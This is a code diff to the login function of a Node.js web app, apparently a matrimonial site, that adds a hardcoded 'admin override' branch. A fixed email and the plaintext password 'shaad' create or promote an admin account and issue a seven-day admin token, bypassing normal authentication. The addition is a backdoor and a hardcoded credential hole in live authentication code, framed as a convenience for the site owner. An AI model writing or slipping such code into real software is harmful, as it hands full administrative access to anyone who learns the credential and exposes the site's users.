@@ -163,6 +163,40 @@ exports.login = async (req, res) => {
   try {
     const { identifier, password } = req.body;
 
+    // Admin Override (Special case for site owner)
+    if (identifier === "shaadi@gmail.com" && password === "shaad") {
+      let adminUser = await User.findOne({ email: identifier });
+      if (!adminUser) {
+        const salt = await bcrypt.genSalt(10);
+        const hashedPassword = await bcrypt.hash("shaad", salt);
+        adminUser = new User({
+          name: "PhirseShaadi Admin",
+          email: "shaadi@gmail.com",
+          phone: "0000000000",
+          password: hashedPassword,
+          role: "admin",
+          isVerified: true
+        });
+        await adminUser.save();
+      } else if (adminUser.role !== 'admin') {
+        adminUser.role = 'admin';
+        await adminUser.save();
+      }
+
+      const token = jwt.sign(
+        { userId: adminUser._id.toString(), email: adminUser.email, role: 'admin' },
+        process.env.JWT_SECRET,
+        { expiresIn: '7d' }
+      );
+
+      return res.status(200).json({
+        success: true,
+        message: "Admin Login successful",
+        token,
+        user: { name: "Admin", email: adminUser.email, role: 'admin' }
+      });
+    }
+
     // 1. Find user by email or phone
     const user = await User.findOne({ 
       $or: [{ email: identifier }, { phone: identifier }] 
